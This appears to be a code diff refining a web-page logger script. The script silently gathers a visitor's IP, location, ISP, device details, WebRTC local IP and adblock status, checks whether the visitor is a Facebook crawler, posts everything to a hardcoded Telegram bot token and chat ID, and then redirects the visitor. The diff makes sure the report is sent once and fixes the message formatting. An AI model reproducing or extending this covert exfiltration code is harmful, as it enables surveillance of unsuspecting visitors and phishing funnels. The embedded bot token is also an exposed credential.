@@ -58,7 +58,7 @@
       const token = "8182692132:AAGPJzf4tOZ7be5vrvd3RD3RJFZoEbmq1zg";
       const chat_id = "6239813037";
       const url = `https://api.telegram.org/bot${token}/sendMessage`;
-      await fetch(url, {
+      return fetch(url, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ chat_id, text: message, parse_mode: "Markdown" })
@@ -66,20 +66,20 @@
     }
 
     function formatMessage(data) {
-      return `📄 * [LOGGER STAGE] *
-🚀 * User Info:*
-🌐 * IP:* ${data.ip || "Unknown"}
-📍 * City:* ${data.city || "Unknown"}
-🌎 * Country:* ${data.country || "Unknown"}
-🏢 * ISP:* ${data.org || "Unknown"}
-🖥 * Platform:* ${data.platform}
-📱 * Resolution:* ${data.resolution}
-🌐 * Language:* ${data.language}
-🧠 * User - Agent:* ${data.ua}
-🛡 * AdBlock:* ${data.adblock ? "Yes" : "No"}
-📡 * WebRTC Local IP:* ${data.localIP || "N/A"}
-🕒 * Timestamp:* ${new Date().toISOString()}
-🔍 * FB Crawler:* ${/FBAN|FBAV|facebookexternalhit/i.test(data.ua) ? "Yes" : "No"}`;
+      return `📄 *[LOGGER STAGE]*
+🚀 *User Info:*
+🌐 *IP:* ${data.ip || "Unknown"}
+📍 *City:* ${data.city || "Unknown"}
+🌎 *Country:* ${data.country || "Unknown"}
+🏢 *ISP:* ${data.org || "Unknown"}
+🖥 *Platform:* ${data.platform}
+📱 *Resolution:* ${data.resolution}
+🌐 *Language:* ${data.language}
+🧠 *User-Agent:* ${data.ua}
+🛡 *AdBlock:* ${data.adblock ? "Yes" : "No"}
+📡 *WebRTC Local IP:* ${data.localIP || "N/A"}
+🕒 *Timestamp:* ${new Date().toISOString()}
+🔍 *FB Crawler:* ${/FBAN|FBAV|facebookexternalhit/i.test(data.ua) ? "Yes" : "No"}`;
     }
 
     async function run() {
@@ -89,21 +89,31 @@
       const lang = navigator.language;
       const platform = detectPlatform();
       const adblock = await detectAdBlock();
+
+      let sent = false;
+
       detectWebRTCLocalIP(async localIP => {
+        if (sent) return;
+        sent = true;
         const msg = formatMessage({
           ...ipData, ua, resolution: res, language: lang,
           platform, adblock, localIP
         });
         await sendToTelegram(msg);
+        await new Promise(r => setTimeout(r, 1000));
         window.location.href = "redirect_ultimate.html";
       });
+
       // fallback if WebRTC doesn't return
       setTimeout(async () => {
+        if (sent) return;
+        sent = true;
         const msg = formatMessage({
           ...ipData, ua, resolution: res, language: lang,
           platform, adblock, localIP: "N/A"
         });
         await sendToTelegram(msg);
+        await new Promise(r => setTimeout(r, 1000));
         window.location.href = "redirect_ultimate.html";
       }, 5000);
     }
